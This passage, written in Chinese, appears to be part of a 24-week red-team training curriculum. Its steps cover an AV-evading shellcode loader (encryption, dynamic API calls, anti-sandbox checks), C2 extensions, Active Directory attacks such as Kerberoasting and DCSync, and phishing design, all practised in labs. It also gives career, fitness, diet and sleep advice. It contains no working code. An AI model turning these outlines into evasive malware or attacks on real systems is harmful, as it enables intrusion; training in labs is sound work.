+    - 整理自动化脚本开发框架
+    - 总结Python并发编程
+    - 记录代码优化思路
+
+周二: Web漏洞扫描工具开发
+  第1小时: 理论
+    - 学习: Web扫描器的设计原理
+    - 学习: HTTP请求构造和分析
+    - 学习: 正则表达式在扫描器中的应用
+    - 了解: 爬虫原理 (广度优先 vs 深度优先)
+  第2小时: 实践
+    使用Python开发Web漏洞检测工具:
+    - 功能模块:
+      1. 爬虫功能: 发现页面和参数
+      2. SQL注入检测 (基于时间盲注)
+      3. XSS检测 (基于反射检测)
+      4. 目录/文件扫描
+    - 实现检测逻辑:
+      - 发送正常请求获取基准响应
+      - 发送注入载荷, 对比响应差异
+      - 基于时间延迟判断盲注
+    - 实现多线程并发提高效率
+    - 添加完整的报告输出功能
+  第3小时: 复盘
+    - 整理扫描器检测逻辑
+    - 总结误报和漏报问题
+    - 记录扫描器优化方向
+
+周三: Shellcode加载器开发
+  第1小时: 理论
+    - 学习: Windows API在攻防中的应用
+    - 学习: Shellcode加载流程:
+      分配内存 -> 复制Shellcode -> 设置执行权限 -> 执行
+    - 学习: C/C++与WinAPI基础
+    - 了解: Golang/Nim开发Payload的优势
+  第2小时: 实践
+    使用C/C++编写Shellcode加载器:
+    1. 基础版本 (使用VirtualAlloc + CreateThread):
+       VirtualAlloc -> memcpy -> VirtualProtect -> CreateThread -> WaitForSingleObject
+    2. 加入免杀技术:
+       - Shellcode加密 (XOR/AES)
+       - 字符串混淆
+       - API动态调用 (GetProcAddress)
+       - 反沙箱检测
+    3. 编译和执行测试
+    4. 使用Go语言重写 (goroutine并发执行)
+    5. 理解为什么Go/Nim的免杀效果更好
+  第3小时: 复盘
+    - 整理Shellcode加载器模板
+    - 总结不同语言的免杀效果
+    - 记录WinAPI安全编程要点
+
+周四: C2扩展开发
+  第1小时: 理论
+    - 学习: 为什么需要定制C2扩展
+    - 学习: Sliver / Cobalt Strike 扩展机制
+    - 学习: BOF (Beacon Object Files) 基础
+    - 了解: BOF与DLL加载的区别
+  第2小时: 实践
+    - 编写Sliver扩展:
+      1. 编写一个简单的信息收集扩展
+      2. 扩展功能: 收集特定注册表键值
+      3. 学习Sliver扩展的目录结构和接口
+    - 了解Cobalt Strike BOF开发 (使用Cobalt Strike套件或替代方案)
+    - 编写一个BOF示例 (枚举进程)
+    - 理解BOF的无文件执行优势
+  第3小时: 复盘
+    - 整理扩展开发模板
+    - 总结BOF的有用性
+    - 记录扩展加载机制
+
+周五: 工具开发综合实践
+  第1小时: 理论
+    - 复习本周开发内容
+    - 学习: 开源工具开发的原则
+    - 了解: GitHub仓库管理和代码发布
+  第2小时: 实践
+    整合前期开发的工具:
+    - 建立个人工具集目录结构
+    - 统一代码风格和注释
+    - 编写README和使用说明
+    - 添加requirements.txt依赖
+    - 推送到GitHub (可选择私有仓库)
+    - 创建工具速查表
+  第3小时: 复盘
+    - 整理个人工具集清单
+    - 总结工具开发经验
+    - 规划下一步开发方向
+
+周六 (复习日):
+  - 完善和测试本周开发的工具
+  - 整理API参考文档
+  - 编写工具的使用手册
+  - 为工具添加单元测试
+
+────────────────────────────────────────────────────────────────
+【第20周: 第三阶段综合考核与总结】
+────────────────────────────────────────────────────────────────
+
+周一: 内网与域渗透复习
+  第1小时: 理论
+    - 复习: AD域渗透核心概念
+    - 复习: Kerberos攻击技术
+    - 复习: 横向移动方法
+  第2小时: 实践
+    - 重新搭建AD实验环境
+    - 复现域渗透完整攻击链
+    - 计时完成域渗透 (目标: 从普通域用户到域管理员 < 2小时)
+    - 尝试不同的攻击路径
+  第3小时: 复盘
+    - 更新域渗透方法论
+    - 记录新的攻击路径发现
+
+周二: 免杀与C2复习
+  第1小时: 理论
+    - 复习: 免杀技术体系
+    - 复习: C2框架使用
+    - 复习: 基础设施设计
+  第2小时: 实践
+    - 重新搭建C2基础设施
+    - 生成新的免杀Payload
+    - 测试检出率
+    - 完成完整的C2操作流程
+  第3小时: 复盘
+    - 更新免杀效果记录
+    - 优化C2 Profile配置
+
+周三: 后渗透与社会工程复习
+  第1小时: 理论
+    - 复习: 后渗透操作流程
+    - 复习: 持久化技术
+    - 复习: 社会工程学攻击链
+  第2小时: 实践
+    - 在实验环境中复现后渗透完整流程
+    - 植入多种持久化方式
+    - 设计并模拟一个社工攻击场景
+  第3小时: 复盘
+    - 完善后渗透检查清单
+    - 更新社工攻击模板
+
+周四: 第三阶段综合考核 (一)
+  第1-3小时: 考核任务
+    目标: 完成一个完整的渗透模拟 (外网打点 -> 内网渗透 -> 域控获取)
+
+    环境: 可自建复合靶场 (Metasploitable 2 + Windows AD域)
+    或使用HTB Pro Labs / TryHackMe中等难度靶场
+
+    要求:
+    1. 外网信息收集和漏洞利用获取初始立足点
+    2. 内网信息收集和横向移动
+    3. 如果环境包含域, 尝试获取域管理员权限
+    4. 全程记录操作步骤
+    5. 输出渗透报告
+
+    推荐考核环境:
+    - TryHackMe: Throwback Network
+    - TryHackMe: Wreath Network
+    - HackTheBox: Offshore, Forest (Active Directory)
+
+周五: 第三阶段综合考核 (二) 与总结
+  第1小时: 继续周四的考核任务
+  第2小时: 撰写渗透报告
+  第3小时: 第三阶段总结
+    - 统计: 掌握的攻击技术, 完成的目标数量
+    - 对比: 与第12周末的能力变化
+    - 反思: 哪些领域还需要加强
+    - 在第三阶段进度表上打勾
+    - 输出第三阶段学习总结 (至少800字)
+
+周六 (复习日):
+  - 整理第三阶段完整知识体系
+  - 制作13-20周的笔记索引
+  - 将薄弱环节记录下来, 制定长期补强计划
+  - 准备进入最终的实战综合期
+
+────────────────────────────────────────────────────────────────
+【第三阶段小结】
+────────────────────────────────────────────────────────────────
+  完成第13-20周后, 你应该具备以下能力:
+    ☐ 理解AD域架构和Kerberos认证流程
+    ☐ 能进行域渗透 (Kerberoasting, PTH/PTT, 委派攻击, DCSync)
+    ☐ 掌握免杀技术并能生成免杀Payload
+    ☐ 能搭建和使用C2框架 (Sliver等)
+    ☐ 掌握后渗透信息收集和凭证窃取技术
+    ☐ 能执行横向移动和持久化操作
+    ☐ 理解社会工程学攻击原理并能设计钓鱼活动
+    ☐ 具备基本的工具开发能力
+
+  在第三阶段进度表上确认所有项目已打勾后, 进入第四阶段。
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+第四阶段: 实战综合期 (第21-24周) 具体计划
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+────────────────────────────────────────────────────────────────
+【第21周: 综合实战 (一) — 完整渗透链】
+────────────────────────────────────────────────────────────────
+
+周一: 实战准备与目标分析
+  第1小时: 选择实战靶场环境:
+    - HTB Machines (中等难度: Teacher, Bastard, Mantis)
+    - TryHackMe (Offensive Pentesting Path)
+    - VulnHub (综合系列: DC-1 到 DC-9)
+    - 自建复合靶场
+  第2小时: 开始信息收集
+    - 完整的主动/被动信息收集
+    - 端口扫描和服务版本检测
+    - Web目录扫描
+    - 输出结构化的侦察报告
+  第3小时: 分析收集的信息, 规划攻击路径
+
+周二: 初始访问获取
+  第1-3小时:
+    - 根据信息收集结果, 选择最可能的攻击向量
+    - 尝试多个漏洞利用路径
+    - 获取初始Shell
+    - 记录失败尝试和原因
+    - 获取立足点后进行基本信息收集
+
+周三: 权限提升
+  第1-3小时:
+    - 系统信息收集 (根据OS使用对应工具)
+    - 利用本地漏洞或配置错误提权
+    - 尝试多种提权路径
+    - 获取最高权限
+    - 收集敏感信息和凭证
+
+周四: 如果目标是复合环境 (含内网)
+  第1-3小时:
+    - 内网信息收集
+    - 横向移动尝试
+    - 更多系统的权限获取
+    - 目标: 获取整个环境的最大控制权
+
+周五: 报告编写与复盘
+  第1-2小时: 编写专业的渗透测试报告
+    - 报告框架:
+      1. 执行摘要 (Executive Summary)
+      2. 测试方法和范围
+      3. 发现和漏洞详情 (含复现步骤)
+      4. 攻击链描述
+      5. 风险等级和修复建议
+      6. 附录 (截图, 工具输出, 时间线)
+    - 注意: 报告应面向不同受众 (技术 vs 管理)
+  第3小时: 本周复盘
+    - 记录本周渗透的关键成功点
+    - 分析失败和卡住的地方
+    - 更新方法论文档
+
+周六 (复习日):
+  - 如果不满意本周进度, 继续完成目标
+  - 优化报告格式
+  - 撰写本周渗透经验总结
+
+────────────────────────────────────────────────────────────────
+【第22周: 综合实战 (二) — 红蓝对抗模拟】
+────────────────────────────────────────────────────────────────
+
+周一: 第二个实战目标
+  第1小时: 选择新的实战靶场 (更复杂的环境)
+    - HTB: Pro Labs (Dante, Offshore, Rastalabs 等 — 需要订阅)
+    - 或 TryHackMe 中等偏难房间
+    - 或搭建含多层网络的自建环境
+  第2小时: 信息收集与侦察
+  第3小时: 攻击路径规划
+
+周二: 获取初始访问
+  第1-3小时:
+    - 尝试更多的攻击向量
+    - 可能需要: Web漏洞利用, CMS漏洞, 服务漏洞
+    - 记录完整的Exploit过程
+    - 获取多个初始Shell
+
+周三: 内网渗透与横向移动
+  第1-3小时:
+    - 搭建内网隧道/代理 (Chisel, SSH Tunnel, Socks)
+    - 内网扫描和发现
+    - 横向移动 (PTH, WMI, PSExec, WinRM)
+    - 凭证收集和利用
+    - 继续扩大控制范围
+
+周四: 域渗透与目标达成
+  第1-3小时:
+    - 如果环境包含AD域, 进行域信息收集
+    - BloodHound分析攻击路径
+    - 域提权 (Kerberoasting, 委派, ACL滥用)
+    - 获取域管理员权限
+    - DCSync导出域凭证
+
+周五: 报告与复盘
+  第1-2小时: 撰写完整的渗透测试报告
+    - 突出红蓝对抗视角的分析
+    - 描述蓝队的检测点和改进建议
+    - 包含攻击时间线
+  第3小时: 本周复盘
+    - 对比两个实战目标的技术差异
+    - 总结攻克每种环境的策略
+    - 更新个人方法论
+
+周六 (复习日):
+  - 如果不满意进度, 继续完成
+  - 整理两周的实战经验
+  - 建立自己的TTP (战术技术流程) 库
+
+────────────────────────────────────────────────────────────────
+【第23周: 认证准备与职业规划】
+────────────────────────────────────────────────────────────────
+
+周一: 国际认证路径介绍
+  第1小时: 理论
+    - 了解以下认证:
+      - OSCP (Offensive Security Certified Professional)
+        - 24小时实战考试 + 24小时报告
+        - 核心: 渗透测试方法论, 无自动化工具限制
+        - 前置: PEN-200课程, 大量靶机练习
+      - OSWE (Offensive Security Web Expert)
+        - Web应用渗透测试, 代码审计/白盒测试
+        - 前置: AWAE/ WEB-300课程
+      - OSEP (Offensive Security Experienced Penetration Tester)
+        - 免杀技术, 域渗透, C2高级操作
+        - 前置: PEN-300/ETBD课程
+      - CRTO (Certified Red Team Operator)
+        - 红队核心: C2, 域渗透, 免杀, 基础设施
+        - 前置: Zero-Point Security RTO课程
+      - eCPPT / eWPT / eJPT (eLearnSecurity/INE)
+        - 入门到中级, 实操考试
+    - 对比各认证的难度、费用和含金量
+  第2小时: 实践
+    - 搜索各认证的最新考试经验和面经
+    - 制定个人认证考试时间线
+    - 推荐路径: eJPT -> OSCP -> CRTO -> OSEP
+    - 下载PEN-200/OSCP相关的免费资源
+    - 关注各认证的考试更新信息
+  第3小时: 复盘
+    - 制定清晰的认证路线图
+    - 评估每个认证的准备时间和费用
+    - 设定短期和长期认证目标
+
+周二: 简历与作品集准备
+  第1小时: 理论
+    - 学习: 安全行业简历的特点
+    - 了解: 安全工程师/红队岗位的技能要求
+    - 了解: 如何展示个人项目和成就
+    - 学习: GitHub个人主页优化
+  第2小时: 实践
+    - 更新个人简历:
+      1. 列出掌握的技术栈
+      2. 列举完成的关键项目:
+         - 个人工具集
+         - 靶机通关记录
+         - 渗透报告范文
+         - 自动化脚本
+      3. 列出已完成的学习路径
+      4. 补充认证目标
+    - 优化GitHub主页:
+      - 完善README
+      - 为每个项目添加文档
+      - 展示工具截图和使用说明
+    - 开始撰写个人技术博客 (可选, 推荐)
+      - 分享靶机Writeup
+      - 记录工具开发过程
+      - 总结学习经验
+  第3小时: 复盘
+    - 建立个人品牌规划文档
+    - 制定博客写作计划
+    - 规划GitHub项目星级目标
+
+周三: 技术面试准备
+  第1小时: 理论
+    - 学习: 安全岗位面试常见题目类型:
+      1. 网络基础 (TCP/IP, OSI, 常见协议)
+      2. Web安全 (XSS, SQLi, CSRF原理和防御)
+      3. 渗透测试方法论 (完整流程)
+      4. 内网渗透场景 (横向移动, 域渗透)
+      5. 代码能力 (Python, Bash, 安全工具开发)
+      6. 场景题 (给定场景, 设计攻击方案)
+    - 了解: 红队面试的特殊关注点:
+      - 免杀经验
+      - C2使用经验
+      - 社工经验
+      - 报告写作能力
+  第2小时: 实践
+    - 整理常见面试题答案
+    - 练习技术问题口头表达
+    - 模拟面试: 录制自己回答技术问题的视频
+    - 场景题练习:
+      1. "你拿到了一个Web服务器的低权限Shell, 如何继续渗透?"
+      2. "你发现目标使用了Windows Defender, 如何绕过?"
+      3. "你拿到了一个域用户的凭证, 如何获取域管理员权限?"
+    - 编写这些场景的详细回答
+  第3小时: 复盘
+    - 整理面试题库
+    - 标记需要加强的知识点
+    - 回顾24周训练中的所有知识薄弱点
+
+周四: 行业趋势与持续学习
+  第1小时: 理论
+    - 了解当前安全行业趋势:
+      - 云安全 (AWS/Azure/GCP)
+      - 容器安全 (Kubernetes, Docker)
+      - 零信任架构
+      - AI/ML在安全对抗中的应用
+      - 供应链攻击
+    - 学习: 如何持续学习和跟进:
+      - RSS订阅 (安全资讯)
+      - Twitter/X安全社区
+      - Reddit (r/netsec, r/redteam)
+      - 安全会议和DEF CON视频
+  第2小时: 实践
+    - 订阅以下安全资讯源:
+      - The Hacker News
+      - BleepingComputer
+      - Krebs on Security
+      - SANS NewsBites
+    - 关注Twitter/X安全研究者:
+      - @harmj0y, @tiraniddo, @gentilkiwi, @mubix, @_RastaMouse
+    - 加入安全社区:
+      - 红队学院 QQ群/Discord
+      - 安全客, 先知社区
+    - 注册并开始参与HackTheBox (如果还没注册)
+      - 建立HTB个人档案
+      - 开始冲击排名
+  第3小时: 复盘
+    - 制定持续学习计划
+    - 列出当前安全技术的兴趣方向
+    - 设定每周的安全资讯时间
+
+周五: 个人成长规划
+  第1小时: 回顾过去22周的训练
+    - 评估学习进度和掌握程度
+    - 对比训练计划与实际情况
+    - 找出需要长期补强的领域
+  第2小时: 制定后续6个月的个人发展计划
+    - 认证考试准备时间线
+    - 靶机练习目标 (每月至少4台HTB)
+    - 工具开发目标 (每月至少1个实用工具)
+    - 社区贡献目标 (Writeup, BUG报告, 工具分享)
+    - 求职或岗位提升规划
+  第3小时: 复盘
+    - 输出个人发展计划文档
+    - 设定可量化的里程碑
+    - 与同行/导师分享计划获取反馈
+
+周六 (复习日):
+  - 整理认证备考资料
+  - 投递一份简历 (如果准备求职)
+  - 完善GitHub和博客
+  - 进行模拟面试练习
+
+────────────────────────────────────────────────────────────────
+【第24周: 最终考核与总结】
+────────────────────────────────────────────────────────────────
+
+周一: 最终考核准备
+  第1-3小时:
+    - 选择最终考核题目:
+      选项A: 完成一台HTB高难度机器 (Hard或以上)
+      选项B: 完成一个完整的渗透实验 (外网->内网->域控)
+      选项C: 开发一款开源安全工具
+    - 搭建考核环境
+    - 制定考核计划和评分标准
+
+周二: 最终考核执行 (一)
+  第1-3小时: 开始考核任务
+    - 独立完成, 不参考之前的笔记
+    - 记录完整的时间线和操作步骤
+    - 记录遇到的问题和解决过程
+    - 每个阶段完成后记录到报告
+
+周三: 最终考核执行 (二)
+  第1-3小时: 继续考核任务
+    - 完成所有考核目标
+    - 如果遇到困难, 允许查阅资料但需注明
+    - 完整记录渗透过程
+
+周四: 报告撰写
+  第1-3小时:
+    - 撰写最终考核的渗透测试报告
+    - 要求:
+      1. 专业的报告格式
+      2. 完整的攻击链描述
+      3. 每个漏洞的详细复现步骤
+      4. 截图和证据
+      5. 修复建议
+      6. 反思和教训总结
+    - 报告应达到可交付客户的水平
+
+周五: 全面总结与结业
+  第1小时: 最终考核复盘
+    - 评估考核表现
+    - 分析成功和失败的原因
+    - 与训练目标对比
+
+  第2小时: 24周全面总结
+    - 统计24周的学习成果:
+      [ ] 掌握的技术概念: _____ 项
+      [ ] 通关的靶机: _____ 台
+      [ ] 开发的工具: _____ 款
+      [ ] 撰写的报告: _____ 份
+      [ ] 完成的渗透链: _____ 条
+    - 对比训练前后能力变化:
+      训练前: 零基础
+      训练后: 独立完成渗透任务
+
+  第3小时: 毕业仪式
+    - 在进度跟踪表上打勾所有阶段
+    - 整理训练期间所有笔记和资源
+    - 制定下一步学习计划
+    - 写一封"给自己的信" — 记录心路历程和未来目标
+    - 庆祝!
+
+周六 (复习日/毕业):
+  - 将24周训练中的所有笔记归档
+  - 备份所有代码和工具
+  - 在GitHub上创建"Red-Team-Training"仓库分享经验 (可选)
+  - 给自己一个奖励!
+
+────────────────────────────────────────────────────────────────
+【第四阶段小结】
+────────────────────────────────────────────────────────────────
+  完成第21-24周后, 你应该具备以下能力:
+    ☐ 能独立完成复杂靶机的渗透测试 (HTB Medium+难度)
+    ☐ 能完成外网打点到内网域控的完整渗透
+    ☐ 能撰写专业的渗透测试报告
+    ☐ 能独立开发安全工具
+    ☐ 制定了清晰的职业发展规划
+    ☐ 具备红队初级队员的实战能力
+================================================================================
+四、身体训练计划 (Physical Training)
+================================================================================
+
+  说明: 红队工作需要长时间面对电脑, 身体健康是可持续学习的基础。
+  每天安排30分钟体能训练, 穿插在学习和休息之间。
+
+────────────────────────────────────────────────────────────────
+每日训练安排
+────────────────────────────────────────────────────────────────
+
+  周一 (力量训练):
+    - 热身 (5分钟): 开合跳, 手臂环绕, 髋关节活动
+    - 俯卧撑 (Push-up): 3组 × 15-20个
+    - 深蹲 (Squat): 3组 × 20个
+    - 平板支撑 (Plank): 3组 × 45-60秒
+    - 拉伸放松 (5分钟)
+
+  周二 (有氧训练):
+    - 跑步3公里 (配速 6-7分钟/公里)
+    - 或跳绳: 4组 × 2分钟 (组间休息30秒)
+    - 或HIIT: 20分钟 (如: 波比跳, 高抬腿, 登山者)
+    - 拉伸放松 (5分钟)
+
+  周三 (力量训练):
+    - 热身 (5分钟)
+    - 箭步蹲 (Lunge): 3组 × 15个/每侧
+    - 俄罗斯转体 (Russian Twist): 3组 × 20个
+    - 引体向上 (Pull-up): 3组 × 5-10个 (或使用弹力带辅助)
+    - 拉伸放松 (5分钟)
+
+  周四 (有氧训练):
+    - 慢跑3公里 或 骑行30分钟
+    - 或游泳30分钟
+    - 或跳绳: 4组 × 3分钟
+    - 拉伸放松 (5分钟)
+
+  周五 (力量训练):
+    - 热身 (5分钟)
+    - 俯卧撑变式 (宽距/窄距/钻石): 各15个
+    - 深蹲跳跃: 3组 × 15个
+    - 登山者 (Mountain Climber): 3组 × 30秒
+    - 臀桥 (Glute Bridge): 3组 × 20个
+    - 拉伸放松 (5分钟)
+
+  周六 (复习日): 可选轻量活动 (散步30分钟或瑜伽)
+
+  周日 (休息日): 完全休息
+
+────────────────────────────────────────────────────────────────
+每日护眼与工位保健 (每天必做)
+────────────────────────────────────────────────────────────────
+
+  眼保健操 (每2小时一次, 训练日3-4次):
+    - 远近调焦法: 拇指距脸15cm, 注视3秒 -> 注视远处物体3秒, 反复10次
+    - 眼球转动: 顺时针 + 逆时针各转5圈
+    - 快速眨眼: 闭眼, 快速眨眼20秒, 润滑眼球
+    - 热敷: 手掌搓热覆盖双眼30秒 (缓解疲劳)
+
+  颈椎拉伸 (每1小时做一次, 每次60秒):
+    - 前后点头: 缓慢低头->抬头, 各5秒, 做5次
+    - 左右侧屈: 头向左右侧倾斜, 各保持10秒
+    - 左右旋转: 缓慢转头看左右肩膀, 各保持10秒
+    - 缩下巴 (Chin Tuck): 下巴后收, 保持5秒, 做10次
+
+  手腕拉伸 (每1小时做一次, 每次60秒):
+    - 手腕伸展: 手臂前伸, 手掌向下, 另一手下压, 保持15秒/侧
+    - 手腕屈曲: 手臂前伸, 手掌向上, 另一手下拉, 保持15秒/侧
+    - 手指张开/握拳: 快速交替20次
+    - 手腕旋转: 顺时针和逆时针各转10圈
+
+  腰部与坐姿:
+    - 保持正确坐姿: 腰靠椅背, 脚平放地面, 屏幕与眼睛平齐
+    - 每45分钟起身活动2分钟 (接水, 走动, 远眺)
+
+================================================================================
+五、饮食计划 (Diet Plan)
+================================================================================
+
+  说明: 红队队员需要高脑力消耗, 饮食对认知功能有直接影响。
+  以下提供科学饮食建议, 可根据个人口味和条件调整。
+
+────────────────────────────────────────────────────────────────
+每日三餐建议
+────────────────────────────────────────────────────────────────
+
+  早餐 (07:00-08:00) — 高蛋白 + 复合碳水:
+    搭配原则: 蛋白质30% + 碳水50% + 健康脂肪20%
+
+    推荐组合 (任选其一):
+    A套餐: 水煮蛋2个 + 全麦面包2片 + 牛奶250ml + 坚果一小把(核桃/杏仁)
+    B套餐: 燕麦粥1碗 + 鸡蛋1个 + 香蕉1根 + 花生酱少许
+    C套餐: 全麦三明治(鸡蛋+生菜+番茄) + 豆浆250ml + 蓝莓少许
+
+    关键营养素:
+    - 鸡蛋: 胆碱 (支持神经递质合成) + 优质蛋白
+    - 全麦: 复合碳水 (稳定血糖, 持续供能)
+    - 坚果: Omega-3 + 维生素E (大脑抗氧化)
+    - 牛奶/豆浆: 钙 + 蛋白质
+
+  午餐 (12:00-13:00) — 均衡营养:
+    搭配原则: 蛋白质30% + 蔬菜40% + 碳水30%
+
+    推荐组合 (任选其一):
+    A套餐: 糙米饭1碗 + 清蒸鱼/鸡胸肉150g + 炒蔬菜(西兰花/菠菜)
+    B套餐: 全麦面条1碗 + 牛肉片100g + 蔬菜沙拉(橄榄油醋汁)
+    C套餐: 荞麦面/藜麦 + 三文鱼/虾100g + 烤蔬菜
+
+    关键营养素:
+    - 鱼肉: DHA/EPA (大脑结构脂肪酸)
+    - 瘦肉: 铁 + 维生素B12 (预防贫血和疲劳)
+    - 蔬菜: 抗氧化剂 + 纤维素
+    - 粗粮: 缓释能量
+
+  晚餐 (18:00-19:00) — 轻食为主:
+    搭配原则: 高纤维 + 适量蛋白 + 低碳水
+
+    推荐组合 (任选其一):
+    A套餐: 蔬菜沙拉(生菜/芝麻菜/番茄/黄瓜) + 烤鸡胸肉100g + 豆腐
+    B套餐: 蔬菜汤 + 蒸鱼100g + 紫薯半个
+    C套餐: 豆腐汤 + 虾仁蔬菜 + 少量杂粮
+
+    注意事项:
+    - 晚餐避免大量碳水 (影响睡眠质量)
+    - 不要吃得太撑 (七分饱即可)
+    - 睡前3小时不进食
+
+────────────────────────────────────────────────────────────────
+训练期间零食
+────────────────────────────────────────────────────────────────
+  推荐:
+    - 坚果 (核桃, 杏仁, 腰果): 不饱和脂肪 + 矿物质
+    - 水果 (蓝莓, 香蕉, 苹果): 抗氧化 + 自然糖分
+    - 黑巧克力 (70%以上可可): 咖啡因 + 黄酮类 (提升专注力)
+    - 酸奶: 益生菌 + 蛋白质
+    - 全麦饼干: 缓释碳水
+
+  避免:
+    - 高糖饮料 (可乐, 奶茶)
+    - 油炸食品 (薯片, 炸鸡)
+    - 过量咖啡 (每天最多2杯)
+    - 加工零食 (含反式脂肪酸)
+
+────────────────────────────────────────────────────────────────
+饮水计划
+────────────────────────────────────────────────────────────────
+  每日饮水: 至少2升 (8杯 × 250ml)
+    - 06:30 起床后: 1杯温水 (唤醒身体)
+    - 09:00: 1杯
+    - 11:00: 1杯
+    - 13:00: 1杯 (午餐后)
+    - 15:00: 1杯
+    - 17:00: 1杯
+    - 19:00: 1杯
+    - 21:00: 1杯
+
+  注意: 训练期间增加饮水量, 运动后及时补水。
+
+────────────────────────────────────────────────────────────────
+推荐补剂 (可选, 建议咨询医生)
+────────────────────────────────────────────────────────────────
+
+  | 补剂名称         | 作用                     | 推荐剂量    |
+  |------------------|--------------------------|-------------|
+  | Omega-3 (DHA/EPA)| 大脑健康, 抗炎, 视力保护  | 1000-2000mg |
+  | 维生素B群        | 能量代谢, 神经系统功能    | 按说明书    |
+  | 维生素D          | 骨骼健康, 免疫, 情绪调节  | 1000-2000IU |
+  | 叶黄素 + 玉米黄质| 视力保护, 蓝光过滤       | 10-20mg     |
+  | 镁 (甘氨酸镁)    | 肌肉放松, 改善睡眠, 抗焦虑 | 200-400mg   |
+  | 咖啡因 + L-茶氨酸| 专注力提升 (需要时使用)   | 100-200mg   |
+
+  重要:
+    - 补剂不能替代均衡饮食
+    - 首次使用建议咨询医生
+    - 从低剂量开始, 观察身体反应
+    - 不建议长期依赖高剂量咖啡因
+
+================================================================================
+六、作息计划 (Sleep Schedule)
+================================================================================
+
+  说明: 睡眠是记忆巩固和大脑恢复的关键时期。红队队员需要
+  高质量睡眠来维持白天的高强度学习和思考能力。
+
+────────────────────────────────────────────────────────────────
+每日作息时间表
+────────────────────────────────────────────────────────────────
+
+  | 时间   | 活动                                       |
+  |--------|--------------------------------------------|
+  | 06:30  | 起床, 洗漱, 喝一杯温水                       |
+  | 07:00  | 早餐 (详见饮食计划)                           |
+  | 07:30  | 体能训练 (每个训练日30分钟)                    |
+  | 08:00  | 自由时间/白天工作或学习                         |
+  | 12:00  | 午餐                                        |
+  | 12:30  | 午休20分钟 (可选, 不超过30分钟)                |
+  | 13:00  | 下午工作或学习                                |
+  | 18:00  | 晚餐                                        |
+  | 19:00  | 训练时间 (3小时, 可调至上午)                   |
+  | 22:00  | 训练结束, 放松                                |
+  | 22:30  | 停止使用电子设备 (手机, 电脑, 平板)             |
+  | 23:00  | 入睡                                        |
+  | 06:30  | 起床 (保证7.5小时睡眠)                        |
+
+────────────────────────────────────────────────────────────────
+睡眠质量提升建议
+────────────────────────────────────────────────────────────────
+
+  1. 睡前准备 (22:30-23:00):
+     - 停止使用电子设备 (蓝光抑制褪黑素分泌)
+     - 如果必须用屏幕, 开启Night Mode/蓝光过滤
+     - 做10分钟轻度拉伸或冥想
+     - 阅读纸质书 (非技术类, 放松大脑)
+     - 准备第二天要穿的衣服和物品
+
+  2. 睡眠环境:
+     - 保持卧室黑暗 (使用遮光窗帘或眼罩)
+     - 保持凉爽温度 (18-22度为最佳)
+     - 保持安静 (使用耳塞如果必要)
+     - 床只用于睡眠 (不在床上工作或学习)
+
+  3. 午休建议:
+     - 时间: 20分钟 (不要超过30分钟, 避免进入深度睡眠)
+     - 最佳时间: 12:30-13:00
+     - 如果无法入睡, 只是闭目养神也有效果
+     - 不要在下午3点后午休
+
+  4. 应对失眠:
+     - 如果躺下20分钟无法入睡, 起床做轻松的事, 等困了再睡
+     - 睡前2小时做轻度运动有助于睡眠
+     - 避免睡前摄入咖啡因 (咖啡, 茶, 巧克力)
+     - 保持固定的起床时间, 即使是周末也不要大幅改变
+
+================================================================================
+七、推荐学习资源 (Learning Resources)
+================================================================================
+
+────────────────────────────────────────────────────────────────
+书籍推荐
+────────────────────────────────────────────────────────────────
+
+  基础类:
+    - 《鸟哥的Linux私房菜 - 基础学习篇》          — Linux入门经典
+    - 《计算机网络: 自顶向下方法》                 — 网络原理教材
+    - 《Python编程: 从入门到实践》                 — Python入门
+    - 《黑客攻防技术宝典: Web实战篇》(Web App Hacker's Handbook)  — Web安全经典
+
+  进阶类:
+    - 《Metasploit渗透测试指南》                   — Metasploit实战
+    - 《Web安全深度剖析》                           — 国内Web安全好书
+    - 《内网安全攻防: 渗透测试实战指南》            — 内网渗透必备
+    - 《The Hacker Playbook 3》                    — 渗透测试实战 (英文)
+    - 《Red Team Development and Operations》        — 红队建设 (英文)
+    - 《Windows Internals》                        — Windows内部原理 (英文)
+
+  高级类:
+    - 《Practical Malware Analysis》               — 恶意代码分析 (英文)
+    - 《The Art of Exploitation》                  — 漏洞利用艺术 (英文)
+    - 《Attacking Network Protocols》              — 网络协议攻击 (英文)
+    - 《Operator Handbook: Red Team Edition》      — 红队操作手册 (英文)
+
+────────────────────────────────────────────────────────────────
+在线平台
+────────────────────────────────────────────────────────────────
+
+  靶机练习:
+    - HackTheBox (https://www.hackthebox.com)     — 最佳实战平台
+    - TryHackMe (https://tryhackme.com)            — 入门友好
+    - VulnHub (https://www.vulnhub.com)            — 免费靶机
+    - Proving Grounds (https://www.offsec.com/labs/) — OSCP备考
+    - Root-Me (https://www.root-me.org)            — 多类别挑战
+
+  Web安全:
+    - PortSwigger Web Security Academy (免费)     — Web安全最佳学习平台
+    - OWASP Juice Shop                             — Web漏洞练习
+    - DVWA (Damn Vulnerable Web Application)       — Web漏洞基础
+
+  资源共享:
+    - Exploit-DB (https://www.exploit-db.com)     — 漏洞利用代码库
+    - SecLists (https://github.com/danielmiessler/SecLists) — 字典集
+    - PayloadsAllTheThings (GitHub)                — Payload大全
+    - GTFOBins (https://gtfobins.github.io)        — Linux提权参考
+    - LOLBAS (https://lolbas-project.github.io)    — Windows提权参考
+    - HackTricks (https://book.hacktricks.xyz)     — 渗透测试百科全书
+
+────────────────────────────────────────────────────────────────
+视频资源
+────────────────────────────────────────────────────────────────
+
+  YouTube频道:
+    - IppSec (HTB靶机Writeup视频, 必看!)
+    - LiveOverflow (二进制安全, 漏洞利用)
+    - NetworkChuck (入门友好)
+    - The Cyber Mentor (渗透测试全面教程)
+    - John Hammond (安全挑战和CTF)
+    - Nahamsec (漏洞赏金狩猎)
+    - 0xDF (HTB Writeup详解)
+
+  B站(适合国内):
+    - 配合关键字搜索: ArchStrike教程, 渗透测试, CTF Writeup
+    - 关注活跃的网络安全UP主
+
+────────────────────────────────────────────────────────────────
+练习靶机推荐(By难度)
+────────────────────────────────────────────────────────────────
+
+  入门级 (Beginner):
+    - Metasploitable 2, Metasploitable 3
+    - DVWA, bWAPP, WebGoat
+    - VulnHub: Kioptrix Level 1-5
+    - TryHackMe - Complete Beginner Path
+    - HackTheBox - Starting Point (Tier 0, 1, 2)
+
+  中级 (Intermediate):
+    - VulnHub: Mr-Robot, FristiLeaks, DC系列
